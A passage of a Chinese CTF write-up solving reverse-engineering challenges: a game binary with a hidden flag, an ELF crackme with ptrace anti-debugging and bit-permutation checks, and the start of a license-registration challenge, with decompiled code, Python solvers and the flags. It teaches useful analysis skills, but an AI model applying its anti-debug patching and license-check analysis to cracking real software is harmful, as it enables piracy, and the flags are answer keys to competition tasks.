<h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><p>这个题目会告知大家这个程序叫做四圣龙神录，其实是可以从github上找到源码的。Rev的题目拿到了源码，那基本上就做出来了。当然源代码肯定没有flag相关的逻辑，可以结合源代码对程序进行审计。<br>首先逆向日常搜索flag字符串，会发现如下的函数:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_4308D0</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></div><div class="line"></div><div class="line">  <span class="keyword">if</span> ( dword_D0CA74 == <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    v0 = sub_40E039(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</div><div class="line">    sub_40D837(<span class="number">0</span>, <span class="number">40</span>, v0, <span class="string">"Flag:%s"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;byte_D0CA78);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个Flag很显然是刻意打印的，那么追踪一下这个byte_D0CA78</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_430730</span><span class="params">(<span class="keyword">char</span> a1)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></div><div class="line">  <span class="keyword">char</span> v2; <span class="comment">// STD7_1</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-8h]</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [esp+E8h] [ebp-8h]</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">54</span>; ++i )</div><div class="line">    byte_AEE308[i] -= a1;</div><div class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; ; j += <span class="number">2</span> )</div><div class="line">  &#123;</div><div class="line">    result = j;</div><div class="line">    <span class="keyword">if</span> ( j &gt;= <span class="number">54</span> )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    v2 = <span class="number">16</span> * trans2num(byte_AEE308[j]);</div><div class="line">    byte_D0CA78[j / <span class="number">2</span>] = trans2num(byte_AEE309[j]) + v2;</div><div class="line">  &#125;</div><div class="line">  dword_D0CA74 = <span class="number">1</span>;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>会找到这个函数，可以看到这里又存储了一个全局变量。这里的运算相当于是将一个数字分成了高4bit和低4bit然后进行合并处理，那么我们继续回溯，检查这个<code>byte_AEE308</code>的来历，会找到另一段的程序逻辑:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_430850</span><span class="params">(<span class="keyword">char</span> a1)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+DCh] [ebp-8h]</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</div><div class="line">  &#123;</div><div class="line">    result = i;</div><div class="line">    <span class="keyword">if</span> ( i &gt;= <span class="number">54</span> )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    byte_AEE308[i] ^= a1;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>跟踪调用关系，会发现这两个函数是由同一个函数调用的:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_430960</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> a2)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></div><div class="line"></div><div class="line">  <span class="keyword">if</span> ( a1 == <span class="number">1</span> )</div><div class="line">    <span class="keyword">return</span> sub_405696(a2);</div><div class="line">  <span class="keyword">if</span> ( a1 == <span class="number">2</span> )</div><div class="line">    result = sub_402A09(a2);</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>跟踪到外面，可以看到这样的逻辑</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">result = dword_D0C03C++ + <span class="number">1</span>;</div><div class="line"> <span class="keyword">if</span> ( dword_D0C03C == <span class="number">1</span> )</div><div class="line">   <span class="keyword">return</span> sub_40A907(dword_D0C03C, <span class="number">255</span>);</div><div class="line"> <span class="keyword">if</span> ( dword_D0C03C == <span class="number">2</span> )</div><div class="line">   result = sub_40A907(dword_D0C03C, <span class="number">19</span>);</div><div class="line"> <span class="keyword">return</span> result;</div></pre></td></tr></table></figure>
<p>结合东方（游戏逻辑！）一般来说都是先1后2，所以是先调用前面那个逻辑后调用后面的逻辑。于是根据调用顺序，我们能够写出解密脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> codecs</div><div class="line">enc = [<span class="number">182</span>,<span class="number">135</span>,<span class="number">181</span>,<span class="number">183</span>,<span class="number">182</span>,<span class="number">187</span>,<span class="number">182</span>,<span class="number">187</span>,<span class="number">182</span>,<span class="number">185</span>,<span class="number">181</span>,<span class="number">184</span>,<span class="number">182</span>,<span class="number">182</span>,<span class="number">181</span>,<span class="number">138</span>,<span class="number">183</span>,<span class="number">181</span>,<span class="number">182</span>,<span class="number">183</span>,<span class="number">185</span>,<span class="number">187</span>,<span class="number">182</span>,<span class="number">185</span>,<span class="number">185</span>,<span class="number">188</span>,<span class="number">182</span>,<span class="number">136</span>,<span class="number">185</span>,<span class="number">185</span>,<span class="number">183</span>,<span class="number">134</span>,<span class="number">185</span>,<span class="number">186</span>,<span class="number">183</span>,<span class="number">134</span>,<span class="number">184</span>,<span class="number">181</span>,<span class="number">185</span>,<span class="number">185</span>,<span class="number">182</span>,<span class="number">135</span>,<span class="number">183</span>,<span class="number">185</span>,<span class="number">185</span>,<span class="number">188</span>,<span class="number">184</span>,<span class="number">138</span>,<span class="number">185</span>,<span class="number">184</span>,<span class="number">182</span>,<span class="number">134</span>,<span class="number">181</span>,<span class="number">136</span> ]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec_one</span><span class="params">(enc, num)</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</div><div class="line">        enc[i] ^= num</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec_two</span><span class="params">(enc, num)</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</div><div class="line">        enc[i] -= num</div><div class="line"></div><div class="line">    tmp = <span class="number">0</span></div><div class="line">    ans = <span class="string">''</span>.join(chr(c) <span class="keyword">for</span> c <span class="keyword">in</span> enc)</div><div class="line">    print(codecs.decode(ans,<span class="string">'hex'</span>))</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    dec_one(enc, <span class="number">255</span>)</div><div class="line">    dec_two(enc, <span class="number">19</span>)</div><div class="line">    <span class="comment"># nuaactf&#123;We1c0m3_2_G3nS0K4o&#125;</span></div></pre></td></tr></table></figure>
<h3 id="Middle"><a href="#Middle" class="headerlink" title="Middle"></a>Middle</h3><p>题目来源：因为难度定位是中等所以叫这个</p>
<h4 id="初步准备"><a href="#初步准备" class="headerlink" title="初步准备"></a>初步准备</h4><p>对于想要做这个题目的人来说，想必也是有了一定的基础。比如说首先要认得这个程序是一个ELF文件是Linux下的可执行文件之类的。（其实我第一次做的时候就不会认这个，滑稽）<br>那么逆向首先无非准备几个工具</p>
<ul>
<li>静态工具：IDA</li>
<li>动态分析工具：gdb</li>
<li>环境：Ubuntu</li>
</ul>
<p>首先运行程序，发现程序两个行为：</p>
<ul>
<li>输入<code>nuaactf{.+}</code>格式的字符串</li>
<li>如果输入完成，会让我们做一个C语言的题目</li>
</ul>
<p>而且在运行的时候会发现，程序会在5秒之内结束。整个题目第一眼逻辑就有了</p>
<h4 id="静态辅助"><a href="#静态辅助" class="headerlink" title="静态辅助"></a>静态辅助</h4><p>掏出静态分析工具，前面一大段其实是字符串在计算对齐的内容，不是特别重要。整体分析就会发现其实是一个给字符串置0的操作。之后的第一个函数<code>sub_80485E4();</code>在打印欢迎内容，之后会遇到函数:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ( ptrace(<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>) &lt; <span class="number">0</span> )</div><div class="line">&#123;</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Hey guys, what are you doing?!not cheat me~"</span>);</div><div class="line">  ++dword_804A0D8;</div><div class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个<code>ptrace</code>上网查就会发现，这个函数会阻止动态调试，这里可以选择将这个内容patch掉，将二进制内容改成90（nop），跳过这个内容。或者gdb调试直接跳过这个内容也可以，反正有办法都行。</p>
<p>之后来到这个地方的逻辑:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">puts</span>(<span class="string">"Hey you, what's your password?"</span>);</div><div class="line"><span class="built_in">puts</span>(<span class="string">"format:nuaactf&#123;&#125;, length:24"</span>);</div><div class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">24</span>; ++i )</div><div class="line">  __isoc99_scanf(<span class="string">"%c"</span>, i + a1);</div><div class="line"><span class="built_in">puts</span>(<span class="string">"em?ok, you can get in..."</span>);</div><div class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</div><div class="line">&#123;</div><div class="line">  result = j;</div><div class="line">  <span class="keyword">if</span> ( j &gt;= <span class="number">24</span> )</div><div class="line">    <span class="keyword">break</span>;</div><div class="line">  *(_BYTE *)(j + a1) = ((<span class="keyword">int</span> (__cdecl *)(_DWORD))loc_8048628)(*(<span class="keyword">unsigned</span> __int8 *)(j + a1));</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以看到这里的内容就是让我们输入一段类似flag的内容，不过注意到，最后会对数组<code>a1</code>的每一个元素进行更新，但是似乎是一个没有被识别成函数的内容，跟进去查看，发现一些奇怪的指令阻止了程序的正常解析，不过仔细观察，似乎这个跳转根本就不会调用到这些神奇的指令，利用前面教过的patch方法，就能够修改掉程序内容，看到正确的程序内容:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">v2 = <span class="number">0</span>;</div><div class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</div><div class="line">  v2 |= (((<span class="keyword">signed</span> <span class="keyword">int</span>)a1 &gt;&gt; i) &amp; <span class="number">1</span>) &lt;&lt; *(_BYTE *)(i + <span class="number">0x804A0C2</span>);</div><div class="line"><span class="keyword">return</span> v2</div></pre></td></tr></table></figure>
<p>这个巨大的数字其实是一个地址，里面内容为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.data:0804A0C2                 db    3</div><div class="line">.data:0804A0C3                 db    7</div><div class="line">.data:0804A0C4                 db    2</div><div class="line">.data:0804A0C5                 db    1</div><div class="line">.data:0804A0C6                 db    6</div><div class="line">.data:0804A0C7                 db    4</div><div class="line">.data:0804A0C8                 db    5</div><div class="line">.data:0804A0C9                 db    0</div></pre></td></tr></table></figure>
<p>理解一下，就相当于是一个数组的下标i在遍历。总的分析这个算法，其实就是<strong>将一个字节的每一bit的顺序重新映射到一个新的位置上</strong>具体对应关系为:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0 1 2 3 4 5 6 7</div><div class="line">3 7 2 1 6 4 5 0</div></pre></td></tr></table></figure>
<h4 id="C语言课程"><a href="#C语言课程" class="headerlink" title="C语言课程"></a>C语言课程</h4><p>然后有一个让大家轻松一下的环节，让大家输入一个程序的运行结果。这个一看就是宏定义的错误实例，即会产生一个非预期的答案</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1+3*1+4 = 8</div></pre></td></tr></table></figure>
<p>不过其实整个考出来跑也是可以的~</p>
<h4 id="最后的答案"><a href="#最后的答案" class="headerlink" title="最后的答案"></a>最后的答案</h4><p>最后一段逻辑如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">v3 = <span class="number">-66</span>;</div><div class="line">v4 = <span class="number">116</span>;</div><div class="line">v5 = <span class="number">48</span>;</div><div class="line">v6 = <span class="number">48</span>;</div><div class="line">v7 = <span class="number">-80</span>;</div><div class="line">v8 = <span class="number">124</span>;</div><div class="line">v9 = <span class="number">-68</span>;</div><div class="line">v10 = <span class="number">-14</span>;</div><div class="line">v11 = <span class="number">42</span>;</div><div class="line">v12 = <span class="number">48</span>;</div><div class="line">v13 = <span class="number">48</span>;</div><div class="line">v14 = <span class="number">16</span>;</div><div class="line">v15 = <span class="number">98</span>;</div><div class="line">v16 = <span class="number">-74</span>;</div><div class="line">v17 = <span class="number">116</span>;</div><div class="line">v18 = <span class="number">-26</span>;</div><div class="line">v19 = <span class="number">-92</span>;</div><div class="line">v20 = <span class="number">88</span>;</div><div class="line">v21 = <span class="number">124</span>;</div><div class="line">v22 = <span class="number">-26</span>;</div><div class="line">v23 = <span class="number">80</span>;</div><div class="line">v24 = <span class="number">124</span>;</div><div class="line">v25 = <span class="number">16</span>;</div><div class="line">v26 = <span class="number">118</span>;</div><div class="line"><span class="built_in">puts</span>(<span class="string">"Well,Well,You get here right?"</span>);</div><div class="line"><span class="keyword">if</span> ( !dword_804A0D8 || dword_804A0D0 )</div><div class="line">&#123;</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"En?No No No you are not clever~"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"!!! Hey !!!"</span>);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Do you remember your password?"</span>);</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    *(_BYTE *)(a1 + i) = *(_BYTE *)(i + a1) ^ dword_804A0D4;</div><div class="line">    <span class="keyword">if</span> ( *(&amp;v3 + i) != *(_BYTE *)(i + a1) )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ( i == <span class="number">24</span> )</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"YOU ARE RIGHT!THE KEY IS FLAG!"</span>);</div><div class="line">  <span class="keyword">else</span></div><div class="line">    <span class="built_in">puts</span>(<span class="string">"O?Nearly"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以看到离正确答案很近了~<br>不过会发现，不是那么容易能够进入这个匹配逻辑。仔细观察会发现，变量<code>dword_804A0D8</code>在一开始的<code>ptrace</code>处出现过，而<code>dword_804A0D0</code>则是会在一个handler里面出现，这个handler其实是注册的一个信号事件，5秒后自动跳转为1（这个地方其实是坑调试器用的，因为调试器可以选择忽略alarm但是此时变量依然会被置为1）不过一样可以用强硬的手段跳过这段逻辑。之后发现是一段关键逻辑比较</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">*(_BYTE *)(a1 + i) = *(_BYTE *)(i + a1) ^ dword_804A0D4;</div><div class="line"><span class="keyword">if</span> ( *(&amp;v3 + i) != *(_BYTE *)(i + a1) )</div><div class="line">  <span class="keyword">break</span>;</div></pre></td></tr></table></figure>
<p>其中<code>dword_804A0D4</code>存放了C语言那段中，我们输入的正确答案。如果输入正确答案，则会通过与上面出现那一大段数字（其实是一个数组）进行异或，得到答案。于是总结下来，我们可以得到整体逻辑:</p>
<ul>
<li>首先对输入进行bit变化</li>
<li>与C语言输入的正确答案进行异或</li>
<li>与程序内部的数据比较</li>
</ul>
<p>因此可以写出解密逻辑:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#   -*- coding:utf-8    -*-</span></div><div class="line"></div><div class="line">bit_map = [<span class="number">7</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">1</span>]</div><div class="line">check = [<span class="number">190</span>, <span class="number">116</span>, <span class="number">48</span>, <span class="number">48</span>, <span class="number">176</span>, <span class="number">124</span>, <span class="number">188</span>, <span class="number">242</span>, <span class="number">42</span>, <span class="number">48</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">98</span>, <span class="number">182</span>, <span class="number">116</span>, <span class="number">230</span>, <span class="number">164</span>, <span class="number">88</span>, <span class="number">124</span>, <span class="number">230</span>, <span class="number">80</span>, <span class="number">124</span>, <span class="number">16</span>, <span class="number">118</span>]</div><div class="line">right_answer = <span class="number">8</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">bit_detrans</span><span class="params">(num)</span>:</span></div><div class="line">    tmp_u = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">        tmp = (num &gt;&gt; i) &amp; <span class="number">0x1</span></div><div class="line">        tmp_u |= (tmp &lt;&lt; bit_map[i])</div><div class="line">    <span class="keyword">return</span> tmp_u</div><div class="line"></div><div class="line"></div><div class="line">tmp = [each ^ right_answer <span class="keyword">for</span> each <span class="keyword">in</span> check]</div><div class="line">ans = [chr(bit_detrans(each)) <span class="keyword">for</span> each <span class="keyword">in</span> tmp]</div><div class="line">print(<span class="string">''</span>.join(ans))  <span class="comment"># nuaactf&#123;Haa!You_G0t_1t!&#125;</span></div></pre></td></tr></table></figure>
<h3 id="BuggyProtect"><a href="#BuggyProtect" class="headerlink" title="BuggyProtect"></a>BuggyProtect</h3><h4 id="初窥"><a href="#初窥" class="headerlink" title="初窥"></a>初窥</h4><p>拿到程序后，首先尝试运行，发现会返回一个选单<br>如果无法运行，需要自己安装一下<code>openssl 1.1.x</code>版本。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Welcome to my tiny software</div><div class="line">1. register</div><div class="line">2. cow say</div><div class="line">3. check flag</div><div class="line">4. trial license</div><div class="line">0. exit</div><div class="line">Your choice:</div></pre></td></tr></table></figure></p>
<ol>
<li>输入注册码</li>
<li>You have no license to run this feature.</li>
<li>You have no license to run this feature.</li>
<li>得到一个试用注册码</li>
</ol>
<p>显而易见，我们需要把从<code>4</code>中拿到的注册码通过<code>1</code>注册一下。然后再尝试运行<code>2, 3</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">Your choice: 2</div><div class="line">please input &gt;123123456</div><div class="line">/ 123123456 \</div><div class="line">  \ ^__^</div><div class="line">    (oo)\_______</div><div class="line">    (__)\       )\/\</div><div class="line">        ||----w |</div><div class="line">        ||     ||</div><div class="line"></div><div class="line">...</div><div class="line">Your choice: 3</div><div class="line">You have no license to run this feature.</div></pre></td></tr></table></figure></p>
<p>我们这个注册码并不能成功的执行check_flag函数。</p>
<h4 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h4><p>显而易见，我们反编译的重点应该放在<code>1. register</code>上，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div></pre></td><td class="code"><pre><div class="line">__int64 sub_1220()</div><div class="line">&#123;</div><div class="line">  signed int v0; // ebp</div><div class="line">  bool v1; // cf</div><div class="line">  bool v2; // zf</div><div class="line">  signed __int64 v3; // rcx</div><div class="line">  const char *v4; // rsi</div><div class="line">  __int64 *v5; // rdi</div><div class="line">  signed __int64 v6; // rcx</div><div class="line">  const char *v7; // rsi</div><div class="line">  __int64 *v8; // rdi</div><div class="line">  char v9; // al</div><div class="line">  bool v10; // cf</div><div class="line">  bool v11; // zf</div><div class="line">  __int64 v13; // [rsp+0h] [rbp-4B8h]</div><div class="line">  char v14; // [rsp+80h] [rbp-438h]</div><div class="line">  unsigned __int64 v15; // [rsp+488h] [rbp-30h]</div><div class="line"></div><div class="line">  v0 = -2;</div><div class="line">  v15 = __readfsqword(0x28u);</div><div class="line">  memset(&amp;v14, 0, 0x400uLL);</div><div class="line">  puts(&quot;paste license here:&quot;);</div><div class="line">  do</div><div class="line">  &#123;</div><div class="line">    while ( 1 )</div><div class="line">    &#123;</div><div class="line">      fgets((char *)&amp;v13, 128, stdin);</div><div class="line">      v3 = 25LL;</div><div class="line">      v4 = &quot;-----BEGIN LICENSE-----\n&quot;;</div><div class="line">      v5 = &amp;v13;</div><div class="line">      do</div><div class="line">      &#123;</div><div class="line">        if ( !v3 )</div><div class="line">          break;</div><div class="line">        v1 = (const unsigned __int8)*v4 &lt; *(_BYTE *)v5;</div><div class="line">        v2 = *v4++ == *(_BYTE *)v5;</div><div class="line">        v5 = (__int64 *)((char *)v5 + 1);</div><div class="line">        --v3;</div><div class="line">      &#125;</div><div class="line">      while ( v2 );</div><div class="line">      v6 = 23LL;</div><div class="line">      v7 = &quot;-----END LICENSE-----\n&quot;;</div><div class="line">      v8 = &amp;v13;</div><div class="line">      v9 = (!v1 &amp;&amp; !v2) - v1;</div><div class="line">      v10 = 0;</div><div class="line">      v11 = v9 == 0;</div><div class="line">      if ( v9 )</div><div class="line">        break;</div><div class="line">      do</div><div class="line">      &#123;</div><div class="line">        if ( !v6 )</div><div class="line">          break;</div><div class="line">        v10 = (const unsigned __int8)*v7 &lt; *(_BYTE *)v8;</div><div class="line">        v11 = *v7++ == *(_BYTE *)v8;</div><div class="line">        v8 = (__int64 *)((char *)v8 + 1);</div><div class="line">        --v6;</div><div class="line">      &#125;</div><div class="line">      while ( v11 );</div><div class="line">      if ( (!v10 &amp;&amp; !v11) == v10 )</div><div class="line">        goto LABEL_16;</div><div class="line">      v0 = 1;</div><div class="line">    &#125;</div><div class="line">    do</div><div class="line">    &#123;</div><div class="line">      if ( !v6 )</div><div class="line">        break;</div><div class="line">      v10 = (const unsigned __int8)*v7 &lt; *(_BYTE *)v8;</div><div class="line">      v11 = *v7++ == *(_BYTE *)v8;</div><div class="line">      v8 = (__int64 *)((char *)v8 + 1);</div><div class="line">      --v6;</div><div class="line">    &#125;</div><div class="line">    while ( v11 );</div><div class="line">    if ( (!v10 &amp;&amp; !v11) == v10 )</div><div class="line">      break;</div><div class="line">    if ( v0 &gt; 0 )</div><div class="line">    &#123;</div><div class="line">      v7 = (const char *)&amp;v13;</div><div class="line">      __strcat_chk(&amp;v14, &amp;v13, 1024LL);</div><div class="line">    &#125;</div><div class="line">    ++v0;</div><div class="line">  &#125;</div><div class="line">  while ( v0 != 8 );</div><div class="line">LABEL_16:</div><div class="line">  sub_16A0(&amp;v14, v7);</div><div class="line">  return 0LL;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
